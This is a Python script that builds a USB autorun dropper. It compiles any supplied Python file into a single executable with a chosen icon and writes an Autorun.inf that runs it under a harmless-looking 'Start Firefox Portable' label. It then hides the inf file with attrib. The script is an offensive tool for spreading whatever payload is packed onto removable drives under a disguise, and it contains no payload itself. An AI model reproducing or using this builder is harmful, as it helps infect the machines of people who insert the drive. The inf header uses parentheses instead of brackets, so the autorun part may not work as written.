import PyInstaller.__main__
import shutil
import os
import time


filename = input('Enter File Path/Name: ')
exename = input('Enter the Output File name with extension: ')
icon = input('Enter \'.ico\' file path: ')
pwd = os.getcwd()
usbdir = os.path.join(pwd,"USB")

print("Output File will be stored in USB folder with \"Autorun.inf\" file being hidden...")
time.sleep(2)

if os.path.isfile(exename):
    os.remove(exename)

# Checking and creating the directory if it doesn't exist
if os.path.exists(usbdir) and os.path.isdir(usbdir):
    pass
else:
    print("Creating \"USB\" Folder...")
    os.mkdir(usbdir)

print("Creating EXE...")

# Creating executable from Python script
PyInstaller.__main__.run([
    filename,
    '--onefile',
    '--clean',
    '--log-level=ERROR',
    '--name='+exename,
    '--icon='+icon
])

print("EXE Created")

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd,"dist",exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
# shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating Autorun file")

# Creating Autorun file
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

print("Setting Up the USB")

# Move files to USB and set to hidden
try:
    shutil.move(exename,usbdir)
    shutil.move("Autorun.inf", usbdir)
except:
    os.remove(usbdir+"\\"+exename)
    os.remove(usbdir+"\\Autorun.inf")
    shutil.move(exename,usbdir)
    shutil.move("Autorun.inf", usbdir)

print("attrib +H "+os.path.join(usbdir,"Autorun.inf"))
os.system("attrib +H \""+os.path.join(usbdir,"Autorun.inf")+"\"") 